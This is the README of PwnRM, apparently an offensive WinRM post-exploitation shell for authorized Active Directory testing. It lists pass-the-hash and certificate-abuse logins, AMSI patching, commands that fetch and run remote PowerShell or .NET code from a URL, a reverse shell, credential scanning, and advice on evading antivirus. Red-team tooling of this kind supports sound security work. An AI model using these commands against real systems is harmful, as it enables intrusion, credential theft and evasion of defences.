<div align="center">

![PwnRM ASCII](src/photos/logo.png)

**Advanced WinRM Post-Exploitation Shell for Windows Active Directory Testing**

![GitHub stars](https://img.shields.io/github/stars/uziii2208/PwnRM?style=for-the-badge&color=gold&logo=github)
[![Hall of Fame](https://img.shields.io/badge/Hall_of_Fame-🏆_h4x0rc-gold?style=for-the-badge&logo=trophy)](HALL_OF_FAME.md)
![GitHub forks](https://img.shields.io/github/forks/uziii2208/PwnRM?style=for-the-badge&color=blue&logo=github)
![GitHub issues](https://img.shields.io/github/issues/uziii2208/PwnRM?style=for-the-badge&color=red&logo=github)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative)
![PyPI](https://img.shields.io/pypi/v/pwnrm?style=for-the-badge&color=purple&logo=pypi)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=for-the-badge&logo=linux)
![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)

An operator-grade WinRM execution framework for authorized Active Directory security assessments: interactive PowerShell runspace over MS-PSRP, every modern AD auth path, stealthy payload delivery, and a built-in AD triage engine - usable as a CLI tool **and** as a Python library.

[Installation](#installation) · [Usage](#usage) · [Commands](#commands) · [AD Triage](#ad-triage) · [Share Scout](#share-scout) · [Session Scout](#session-scout) · [Library Usage](#library-usage) · [Troubleshooting](#troubleshooting) · [Disclaimer](#disclaimer) · [Hall Of Fame](HALL_OF_FAME.md)

</div>

<a id="installation"></a>
## Installation

**pip (recommended)**

```bash
pip install pwnrm

# Update when we have new release
# (highly recommend when we have critical issue at previous version)
pip install --upgrade pwnrm
```

**git clone + installer** (Kali / Ubuntu / Debian)

```bash
git clone https://github.com/uziii2208/PwnRM.git
cd PwnRM
sudo bash install.sh
```

The installer creates a virtualenv at `/opt/pwnrm` and registers a global `pwnrm` wrapper.

**Manual / dev**

```bash
git clone https://github.com/uziii2208/PwnRM.git
cd PwnRM
python3 -m venv venv && source venv/bin/activate
pip install -e .
```

<a id="usage"></a>
## Usage

```bash
# Password
pwnrm -u Administrator -p 'P@ssw0rd!' 192.168.1.10

# Pass-the-Hash
pwnrm -u Administrator -H :aad3b435b51404eeaad3b435b51404ee dc01.corp.local

# Kerberos (ccache / KRB5CCNAME)
pwnrm -u administrator@CORP.LOCAL -k --ccache /tmp/admin.ccache dc01.corp.local

# Client certificate - ADCS abuse paths (ESC1 / ESC9 / Shadow Credentials)
pwnrm -u administrator@CORP.LOCAL --pfx admin.pfx --pfx-pass secret https://dc01:5986

# CredSSP (double-hop / credential delegation)
pwnrm -u admin -p 'P@ss' --credssp dc01.corp.local

# Non-interactive single command
pwnrm -u admin -p 'P@ss' dc01.corp.local -X "whoami /all"
```

Key flags: `--port`, `--ssl`, `--timeout`, `--ts`, `--debug`. Run `pwnrm -h` for the full list.

<a id="commands"></a>
## Commands

| Command | Description |
| --- | --- |
| `!download RPATH [LPATH]` | Pull file/dir from target (dirs auto-zipped) |
| `!upload [-xor] LPATH [RPATH]` | Push file; `-xor` for encrypted staging |
| `!amsi` | Patch `AmsiScanBuffer` in the remote process |
| `!psrun [-xor] URL` | Execute remote PowerShell via obfuscated ScriptBlock |
| `!netrun [-xor] URL [ARG..]` | Load & invoke remote .NET assembly |
| `!revshell IP PORT` | Raw Winsock reverse shell (full I/O) |
| `!adtriage [-q]` | Built-in AD enumeration engine (see below) |
| `!shares [-q] [HOST ..]` | SMB share scout - UNC access, ACLs, SYSVOL GPP cPassword detection |
| `!sessions [-q]` | Session & network snapshot - logon sessions, Kerberos tickets, TCP, named pipes |
| `!sysinfo` | OS / AV / hotfix / local-admin snapshot |
| `!creds` | DPAPI / PS-history / credential artifact scanner |
| `!log` / `!stoplog` | Toggle session transcript |
| `exit` / `Ctrl+D` | Close session · `Ctrl+C` interrupts a running command |

Tab-completion for all built-ins via `prompt_toolkit`.

<a id="ad-triage"></a>
## AD Triage

`!adtriage` runs a self-contained LDAP/WMI enumeration entirely inside the remote PowerShell session - no extra binaries on target. `-q` = quick mode (identity + domain + Server 2025 / BadSuccessor check).

Covers: identity & privileges · domain / forest / DCs / trusts · high-value groups · Kerberoastable SPNs · AS-REP roastables · unconstrained / constrained / RBCD delegation · ADCS templates (ESC1/3/4 quick scan) · gMSA / dMSA (BadSuccessor) · ACL quick-wins on DA/DC/krbtgt · pre-Windows-2000 compat access · password-never-expires admins.

<a id="share-scout"></a>
## Share Scout

`!shares` runs a self-contained SMB share enumeration entirely inside the remote PowerShell session - no extra binaries on target. `-q` = quick mode (local shares + UNC probe only). Optionally pass explicit `[HOST ..]` to scan remote machines; without targets, auto-discovers domain computers via AD (capped at 20 hosts).

Covers: local share inventory via `Win32_Share` · UNC access testing (read **and** write probe) · ACL quick-wins flagging `Everyone / Authenticated Users` with write rights · SYSVOL/NETLOGON sensitive file sweep · **GPP `cPassword` auto-detection** (CVE-2014-1812) · open files (`net files`) · active SMB sessions (`net session`).

<a id="session-scout"></a>
## Session Scout

`!sessions` runs a self-contained active logon session and network snapshot entirely inside the remote PowerShell session - no extra binaries on target. `-q` = quick mode (logon sessions + RDP MRU only).

Covers: interactive / remote / service logon sessions via `Win32_LogonSession` · RDP client MRU and saved credentials from registry · Kerberos ticket cache (`klist`) with TGT flagging · established TCP connections with process attribution and external IP detection · listening port inventory with service labels (RDP, MSSQL, WinRM, etc.) · named pipe exposure with sensitive pipe flagging (`lsass`, `spoolss`, `samr`, `epmapper`...) · SYSTEM-level scheduled tasks currently running.

<a id="library-usage"></a>
## Library Usage

```python
from pwnrm import Runspace, PwnShell, create_transport, argument_parser

args = argument_parser().parse_args(["-u", "admin", "-p", "P@ss", "10.0.0.5"])
with Runspace(create_transport(args), int(args.timeout)) as rs:
    shell = PwnShell(rs)
    print(shell.run_sync("whoami /all"))        # blocking
    for out in rs.run_command("Get-Process"):   # streaming
        print(out)
```

## Directory Structure

```
PwnRM/
├── src/pwnrm/
│   ├── __init__.py            # public API
│   ├── __main__.py            # python -m pwnrm
│   ├── cli.py                 # CLI entry point
│   ├── core/                  # transports, Runspace, MS-PSRP
│   ├── shell/                 # PwnShell, built-in commands, AD/share/session triage
│   └── resources/             # adtriage.ps1 · shares.ps1 · sessions.ps1
├── pyproject.toml             # PyPI packaging
├── install.sh                 # Linux installer
└── requirements.txt
```

<a id="troubleshooting"></a>
## Troubleshooting

| Problem | Fix |
| --- | --- |
| `pwnrm: command not found` | `pip install pwnrm` or `sudo bash install.sh` (clone mode) |
| Kerberos `KRB_AP_ERR_SKEW` | `sudo ntpdate <DC_IP>` |
| WinRM connection refused | On target: `Enable-PSRemoting -Force` |
| AMSI catches payloads | `!amsi` first, or `!upload -xor` + `!netrun -xor` |

<a id="disclaimer"></a>
## ⚠️ Disclaimer

PwnRM is for **authorized** security testing, red-team operations, and education only. You must have explicit written authorization (RoE / signed scope) before targeting any system. The authors assume no liability for misuse. Never use against systems you do not own or lack permission to test.

## Credits

Core author: **uziii2208** · Built on [Impacket](https://github.com/fortra/impacket) · Concept: original `winrmexec.py`

## License

MIT - see [LICENSE](LICENSE.md).

<div align="center">

**ENJOY YOUR MEAL.** 

</div>